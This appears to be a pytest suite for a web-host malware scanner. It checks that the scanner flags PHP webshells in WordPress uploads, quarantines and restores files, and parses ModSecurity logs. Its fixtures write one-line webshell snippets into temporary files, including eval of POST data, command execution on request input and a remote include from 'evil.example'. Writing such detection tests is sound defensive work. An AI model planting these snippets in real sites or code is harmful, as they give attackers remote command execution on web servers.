from __future__ import annotations

import json
import shutil
import sys
from pathlib import Path
from unittest.mock import MagicMock

import pytest

HELPER_DIR = Path(__file__).resolve().parents[2] / "packaging" / "host-protect-helper"
sys.path.insert(0, str(HELPER_DIR))

import sinexis_host_scan as helper  # noqa: E402


@pytest.fixture(autouse=True)
def _hide_optional_engines(monkeypatch: pytest.MonkeyPatch) -> None:
    real_which = shutil.which

    def fake_which(name: str, path: str | None = None) -> str | None:
        if name in {"yara", "clamscan", "clamdscan"}:
            return None
        return real_which(name, path=path)

    monkeypatch.setattr(helper.shutil, "which", fake_which)


def test_outside_jail_nonzero_no_post(monkeypatch: pytest.MonkeyPatch):
    posted: list[object] = []

    def boom(*_a, **_k):
        posted.append(1)
        raise AssertionError("must not POST")

    monkeypatch.setattr(helper, "post_results", boom)
    rc = helper.run(
        [
            "--root",
            "/tmp/not-allowlisted",
            "--scan-id",
            "00000000-0000-0000-0000-000000000001",
            "--agent-id",
            "00000000-0000-0000-0000-000000000002",
            "--api-base",
            "https://example.invalid",
            "--token",
            "tok",
        ]
    )
    assert rc == 2
    assert posted == []


def test_needles_hit_dry_run(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "cache.php").write_text("<?php eval($_POST['x']); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    assert payload["engine"] == "needles"
    assert any(
        f["rel_path"].endswith("cache.php") and f["rule_id"] == "sinexis.php.eval_post" for f in payload["findings"]
    )
    assert all("class" in f and "sha256" in f for f in payload["findings"])


def test_needles_hit_adminer_dropper(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "db.php").write_text("Software: Adminer\n", encoding="utf-8")
    (uploads / "dl.php").write_text('<?php file_get_contents("http://x"); ?>', encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.adminer" in rule_ids
    assert "sinexis.php.http_dropper" in rule_ids


def test_needles_hit_assert_preg_create(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "a.php").write_text("<?php assert($_REQUEST['x']); ?>", encoding="utf-8")
    (uploads / "p.php").write_text('<?php preg_replace("/.*/e", $_POST["x"]); ?>', encoding="utf-8")
    (uploads / "c.php").write_text("<?php create_function($_POST['x']); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.assert_input" in rule_ids
    assert "sinexis.php.preg_replace_e" in rule_ids
    assert "sinexis.php.create_function" in rule_ids


def test_needles_hit_obfuscation(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "e.php").write_text("<?php eval(gzinflate($_POST['x'])); ?>", encoding="utf-8")
    (uploads / "g.php").write_text("<?php gzuncompress(base64_decode('x')); ?>", encoding="utf-8")
    (uploads / "r.php").write_text("<?php str_rot13($_REQUEST['x']); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.eval_b64" in rule_ids
    assert "sinexis.php.gzinflate_b64" in rule_ids
    assert "sinexis.php.str_rot13_input" in rule_ids


def test_needles_hit_include_backtick_proc(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "i.php").write_text("<?php require('http://evil.example/x'); ?>", encoding="utf-8")
    (uploads / "b.php").write_text("<?php `$_POST['c']`; ?>", encoding="utf-8")
    (uploads / "p.php").write_text("<?php popen($_GET['c'], 'r'); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.include_http" in rule_ids
    assert "sinexis.php.backtick_input" in rule_ids
    assert "sinexis.php.proc_open_input" in rule_ids


def test_needles_hit_exec_system_unserialize(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "e.php").write_text("<?php exec($_POST['c']); ?>", encoding="utf-8")
    (uploads / "s.php").write_text("<?php passthru($_REQUEST['c']); ?>", encoding="utf-8")
    (uploads / "u.php").write_text("<?php unserialize($_GET['x']); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.exec_input" in rule_ids
    assert "sinexis.php.system_post" in rule_ids
    assert "sinexis.php.unserialize_input" in rule_ids


def test_needles_hit_fileput_upload_evalfiles(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "w.php").write_text("<?php file_put_contents($_GET['f'], 'x'); ?>", encoding="utf-8")
    (uploads / "m.php").write_text("<?php copy($_FILES['f']['tmp_name'], 'x.php'); ?>", encoding="utf-8")
    (uploads / "f.php").write_text("<?php include($_FILES['x']['tmp_name']); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.file_put_input" in rule_ids
    assert "sinexis.php.move_uploaded" in rule_ids
    assert "sinexis.php.eval_files" in rule_ids


def test_needles_hit_cookie_calluser_include(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "k.php").write_text("<?php eval($_COOKIE['x']); ?>", encoding="utf-8")
    (uploads / "c.php").write_text("<?php call_user_func($_GET['f']); ?>", encoding="utf-8")
    (uploads / "i.php").write_text("<?php require($_POST['p']); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.eval_cookie" in rule_ids
    assert "sinexis.php.call_user_input" in rule_ids
    assert "sinexis.php.include_input" in rule_ids


def test_needles_hit_system_cookie_extract_arraymap(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "s.php").write_text("<?php passthru($_COOKIE['x']); ?>", encoding="utf-8")
    (uploads / "e.php").write_text("<?php parse_str($_GET['q']); ?>", encoding="utf-8")
    (uploads / "m.php").write_text("<?php array_filter($_POST['f']); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.system_cookie" in rule_ids
    assert "sinexis.php.extract_input" in rule_ids
    assert "sinexis.php.array_map_input" in rule_ids


def test_needles_hit_shutdown_preg_evalgz(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "r.php").write_text("<?php register_tick_function($_GET['f']); ?>", encoding="utf-8")
    (uploads / "p.php").write_text("<?php mb_ereg_replace($_POST['p']); ?>", encoding="utf-8")
    (uploads / "z.php").write_text("<?php eval(strrev($x)); ?>", encoding="utf-8")
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    rule_ids = {f["rule_id"] for f in payload["findings"]}
    assert "sinexis.php.register_shutdown" in rule_ids
    assert "sinexis.php.preg_callback_input" in rule_ids
    assert "sinexis.php.eval_gzuncompress" in rule_ids


def test_missing_dir_nonzero(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", ("/var/www",))
    rc = helper.run(
        [
            "--root",
            "/var/www/host-protect-missing-s10-xyz",
            "--scan-id",
            "00000000-0000-0000-0000-000000000001",
            "--agent-id",
            "00000000-0000-0000-0000-000000000002",
            "--dry-run",
        ]
    )
    assert rc == 3


def test_post_called_on_success(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    (tmp_path / "ok.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    mock_post = MagicMock(return_value=200)
    monkeypatch.setattr(helper, "post_results", mock_post)
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            "--agent-id",
            "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
            "--api-base",
            "https://example.invalid",
            "--token",
            "secret-token",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
        ]
    )
    assert rc == 0
    mock_post.assert_called_once()
    args = mock_post.call_args[0]
    assert args[0] == "https://example.invalid"
    assert args[1] == "secret-token"
    payload = args[2]
    assert payload["engine"] == "needles"
    assert payload["scan_id"] == "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"


def test_poll_fetches_and_scans(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    (tmp_path / "ok.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    mock_post = MagicMock(return_value=200)
    monkeypatch.setattr(helper, "post_results", mock_post)
    monkeypatch.setattr(
        helper,
        "fetch_jobs",
        lambda *_a, **_k: (
            1,
            [{"kind": "scan", "scan_id": "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", "root_path": str(tmp_path)}],
        ),
    )
    rc = helper.run(
        [
            "poll",
            "--agent-id",
            "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
            "--api-base",
            "https://example.invalid",
            "--token",
            "secret-token",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
        ]
    )
    assert rc == 0
    mock_post.assert_called()


def test_poll_missing_creds():
    rc = helper.run(["poll", "--agent-id", "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb"])
    assert rc == 4


def test_http_headers_include_user_agent():
    headers = helper._agent_headers("tok")
    assert headers["User-Agent"] == helper.USER_AGENT
    assert headers["X-Host-Agent-Token"] == "tok"
    json_headers = helper._agent_headers("tok", json_body=True)
    assert json_headers["Content-Type"] == "application/json"
    assert json_headers["User-Agent"] == helper.USER_AGENT


def test_yara_optional_without_binary(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper.shutil, "which", lambda _n: None)
    assert helper.yara_available() is False


def test_clam_skips_without_binary(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper.shutil, "which", lambda _n: None)
    assert helper.clam_binary() is None
    assert helper.scan_clam("/var/www/html") == []


def test_clam_parses_found(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    infected = tmp_path / "eicar.txt"
    infected.write_text("eicar", encoding="utf-8")
    monkeypatch.setattr(helper, "clam_binary", lambda: "/usr/bin/clamscan")

    class Fake:
        stdout = f"{infected}: Win.Test.EICAR_HDB-1 FOUND\n"

    monkeypatch.setattr(helper.subprocess, "run", lambda *_a, **_k: Fake())
    hits = helper.scan_clam(str(tmp_path))
    assert hits[0]["class"] == "malware"
    assert hits[0]["rule_id"].startswith("clam.")
    assert hits[0]["rel_path"] == "eicar.txt"


def test_quarantine_restore_jail(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path / "www"),))
    web = tmp_path / "www"
    uploads = web / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    src = uploads / "cache.php"
    src.write_text("evil", encoding="utf-8")
    qroot = tmp_path / "libq"
    rc = helper.run(
        [
            "quarantine",
            "--root",
            str(web),
            "--rel-path",
            "wp-content/uploads/cache.php",
            "--site-id",
            "site-a",
            "--dest-basename",
            "abcd1234_cache.php",
            "--quarantine-root",
            str(qroot),
        ]
    )
    assert rc == 0
    assert not src.exists()
    dest = qroot / "site-a" / "abcd1234_cache.php"
    assert dest.is_file()
    assert oct(dest.parent.stat().st_mode)[-3:] == "700"
    rc2 = helper.run(
        [
            "restore",
            "--root",
            str(web),
            "--rel-path",
            "wp-content/uploads/cache.php",
            "--site-id",
            "site-a",
            "--dest-basename",
            "abcd1234_cache.php",
            "--quarantine-root",
            str(qroot),
        ]
    )
    assert rc2 == 0
    assert src.is_file()
    assert not dest.exists()
    rc3 = helper.run(
        [
            "quarantine",
            "--root",
            str(web),
            "--rel-path",
            "wp-content/uploads/cache.php",
            "--site-id",
            "site-a",
            "--dest-basename",
            "abcd1234_cache.php",
            "--quarantine-root",
            str(qroot),
        ]
    )
    assert rc3 == 0
    rc4 = helper.run(
        [
            "quarantine",
            "--root",
            str(web),
            "--rel-path",
            "wp-content/uploads/cache.php",
            "--site-id",
            "site-a",
            "--dest-basename",
            "abcd1234_cache.php",
            "--quarantine-root",
            str(qroot),
        ]
    )
    assert rc4 == 0


def test_quarantine_src_and_dest_conflict(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path / "www"),))
    web = tmp_path / "www"
    uploads = web / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    src = uploads / "cache.php"
    src.write_text("new", encoding="utf-8")
    qroot = tmp_path / "libq"
    dest_dir = qroot / "site-a"
    dest_dir.mkdir(parents=True)
    (dest_dir / "abcd1234_cache.php").write_text("old", encoding="utf-8")
    rc = helper.run(
        [
            "quarantine",
            "--root",
            str(web),
            "--rel-path",
            "wp-content/uploads/cache.php",
            "--site-id",
            "site-a",
            "--dest-basename",
            "abcd1234_cache.php",
            "--quarantine-root",
            str(qroot),
        ]
    )
    assert rc == 6
    assert src.is_file()


def test_poll_runs_quarantine_and_acks(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("SINEXIS_POLL_LOCK_DIR", str(tmp_path / "locks"))
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path / "www"),))
    web = tmp_path / "www"
    uploads = web / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    src = uploads / "cache.php"
    src.write_text("evil", encoding="utf-8")
    qroot = tmp_path / "libq"
    ack = MagicMock(return_value=200)
    monkeypatch.setattr(helper, "post_command_ack", ack)
    monkeypatch.setattr(
        helper,
        "fetch_jobs",
        lambda *_a, **_k: (
            1,
            [
                {
                    "kind": "quarantine",
                    "command_id": "cccccccc-cccc-cccc-cccc-cccccccccccc",
                    "root_path": str(web),
                    "rel_path": "wp-content/uploads/cache.php",
                    "dest_basename": "abcd1234_cache.php",
                    "site_id": "site-a",
                }
            ],
        ),
    )
    rc = helper.run(
        [
            "poll",
            "--agent-id",
            "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
            "--api-base",
            "https://example.invalid",
            "--token",
            "secret-token",
            "--quarantine-root",
            str(qroot),
        ]
    )
    assert rc == 0
    assert not src.exists()
    ack.assert_called_once()
    assert ack.call_args[0][3] == "cccccccc-cccc-cccc-cccc-cccccccccccc"
    assert ack.call_args[0][4] is True


def test_quarantine_outside_jail(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", ("/var/www",))
    rc = helper.run(
        [
            "quarantine",
            "--root",
            "/tmp/not-www",
            "--rel-path",
            "x.php",
            "--site-id",
            "s1",
            "--dest-basename",
            "aa_x.php",
            "--quarantine-root",
            str(tmp_path / "q"),
        ]
    )
    assert rc == 2


def test_quarantine_missing_file_no_move(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path / "www"),))
    web = tmp_path / "www"
    web.mkdir()
    rc = helper.run(
        [
            "quarantine",
            "--root",
            str(web),
            "--rel-path",
            "gone.php",
            "--site-id",
            "s1",
            "--dest-basename",
            "aa_gone.php",
            "--quarantine-root",
            str(tmp_path / "q"),
        ]
    )
    assert rc == 6
    assert not (tmp_path / "q" / "s1").exists() or not any((tmp_path / "q" / "s1").iterdir())


def test_parse_modsec_json_strips_query_no_body():
    blob = json.dumps(
        {
            "transaction": {
                "request": {"method": "POST", "uri": "/search.php?q=1"},
                "response": {"http_code": 403},
            },
            "messages": [{"details": {"ruleId": "1002"}}],
        }
    )
    events = helper.parse_modsec_audit_events(blob)
    assert len(events) == 1
    assert events[0]["path"] == "/search.php"
    assert events[0]["action"] == "block"
    assert events[0]["rule_id"] == "1002"
    assert "body" not in events[0]


def test_parse_modsec_ndjson_txn_messages():
    blob = "\n".join(
        [
            json.dumps(
                {
                    "transaction": {
                        "request": {"method": "GET", "uri": "/sinexis-waf-lab"},
                        "response": {"http_code": 403, "body": ""},
                        "messages": [{"message": "mock.lab.probe", "details": {"ruleId": "1004"}}],
                    }
                }
            ),
            json.dumps(
                {
                    "transaction": {
                        "request": {"method": "GET", "uri": "/sinexis-waf-lab"},
                        "response": {"http_code": 403, "body": ""},
                        "messages": [{"message": "mock.lab.probe", "details": {"ruleId": "1004"}}],
                    }
                }
            ),
        ]
    )
    events = helper.parse_modsec_audit_events(blob)
    assert len(events) == 2
    assert events[0]["rule_id"] == "1004"
    assert events[0]["path"] == "/sinexis-waf-lab"
    assert events[0]["action"] == "block"
    assert "body" not in events[0]
    assert len(helper.dedupe_waf_events(events)) == 1


def test_poll_posts_waf_events(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("SINEXIS_POLL_LOCK_DIR", str(tmp_path / "locks"))
    audit = tmp_path / "modsec_audit.log"
    audit.write_text(
        json.dumps(
            {
                "transaction": {
                    "request": {"method": "GET", "uri": "/wp-login.php?x=1"},
                    "response": {"http_code": 403},
                },
                "messages": [{"details": {"ruleId": "1001"}}],
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("SINEXIS_WAF_AUDIT_LOG", str(audit))
    monkeypatch.setenv("SINEXIS_WAF_SITE_ID", "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa")
    posted: list[dict[str, object]] = []
    monkeypatch.setattr(helper, "fetch_jobs", lambda *_a, **_k: (0, []))

    def _capture(_api: str, _tok: str, payload: dict[str, object], _timeout: int) -> int:
        posted.append(payload)
        return 200

    monkeypatch.setattr(helper, "post_waf_events", _capture)
    rc = helper.run(
        [
            "poll",
            "--agent-id",
            "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
            "--api-base",
            "https://example.invalid",
            "--token",
            "secret-token",
        ]
    )
    assert rc == 0
    assert len(posted) == 1
    assert posted[0]["events"][0]["path"] == "/wp-login.php"
    assert posted[0]["events"][0]["rule_id"] == "1001"


def test_parse_modsec_drops_vendor_and_static():
    im360 = json.dumps(
        {
            "transaction": {
                "request": {"method": "GET", "uri": "/libraries/axios/axios.min.js"},
                "response": {"http_code": 200},
                "messages": [{"details": {"ruleId": "77350396"}}],
            }
        }
    )
    mixed = json.dumps(
        {
            "transaction": {
                "request": {"method": "GET", "uri": "/xmlrpc.php"},
                "response": {"http_code": 404},
                "messages": [
                    {"details": {"ruleId": "77350396"}},
                    {"details": {"ruleId": "1001"}},
                ],
            }
        }
    )
    assert helper.parse_modsec_audit_events(im360) == []
    events = helper.parse_modsec_audit_events(mixed)
    assert len(events) == 1
    assert events[0]["rule_id"] == "1001"
    assert events[0]["path"] == "/xmlrpc.php"


def test_yara_cli_maps_meta_id(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    shell = uploads / "cache.php"
    shell.write_text("<?php eval($_POST['x']); ?>", encoding="utf-8")
    pack = helper.load_signature_pack(HELPER_DIR / "rules")
    ident_map = {str(s["ident"]): (str(s["rule_id"]), str(s["hit_class"])) for s in pack}
    monkeypatch.setattr(helper.shutil, "which", lambda _n, path=None: "/usr/bin/yara")

    class Fake:
        returncode = 0
        stdout = f"sinexis_php_eval_post {shell}\n"
        stderr = ""

    monkeypatch.setattr(helper.subprocess, "run", lambda *_a, **_k: Fake())
    hits = helper.scan_yara_cli(str(tmp_path), HELPER_DIR / "rules" / "php_webshell.yar", ident_map, 30)
    assert hits is not None
    assert any(h["rule_id"] == "sinexis.php.eval_post" and h["rel_path"].endswith("cache.php") for h in hits)


def test_yara_compile_fail_falls_to_needles(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "cache.php").write_text("<?php eval($_POST['x']); ?>", encoding="utf-8")
    monkeypatch.setattr(helper.shutil, "which", lambda _n, path=None: "/usr/bin/yara")

    class Fake:
        returncode = 1
        stdout = ""
        stderr = "error: syntax error\n"

    monkeypatch.setattr(helper.subprocess, "run", lambda *_a, **_k: Fake())
    out = tmp_path / "out.json"
    rc = helper.run(
        [
            "--root",
            str(tmp_path),
            "--scan-id",
            "11111111-1111-1111-1111-111111111111",
            "--agent-id",
            "22222222-2222-2222-2222-222222222222",
            "--rules-dir",
            str(HELPER_DIR / "rules"),
            "--dry-run",
            "--json-out",
            str(out),
        ]
    )
    assert rc == 0
    payload = json.loads(out.read_text(encoding="utf-8"))
    assert payload["engine"] == "needles"


def test_clam_connect_fail_falls_back_to_clamscan(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(helper, "ALLOWED_PREFIXES", (str(tmp_path),))
    infected = tmp_path / "eicar.txt"
    infected.write_text("eicar", encoding="utf-8")
    calls: list[list[str]] = []

    def which(name: str, path: str | None = None) -> str | None:
        if name == "clamdscan":
            return "/usr/bin/clamdscan"
        if name == "clamscan":
            return "/usr/bin/clamscan"
        return None

    monkeypatch.setattr(helper.shutil, "which", which)

    class Fake:
        def __init__(self, cmd: list[str]) -> None:
            self.returncode = 2 if "clamdscan" in cmd[0] else 1
            self.stderr = "Can't connect to clamd" if "clamdscan" in cmd[0] else ""
            self.stdout = "" if "clamdscan" in cmd[0] else f"{infected}: Eicar-Test-Signature FOUND\n"

    def run(cmd: list[str], **_k: object) -> Fake:
        calls.append(cmd)
        return Fake(cmd)

    monkeypatch.setattr(helper.subprocess, "run", run)
    hits = helper.scan_clam(str(tmp_path))
    assert any("clamdscan" in c[0] for c in calls)
    assert any(c[0].endswith("clamscan") for c in calls)
    assert hits[0]["rule_id"].startswith("clam.")
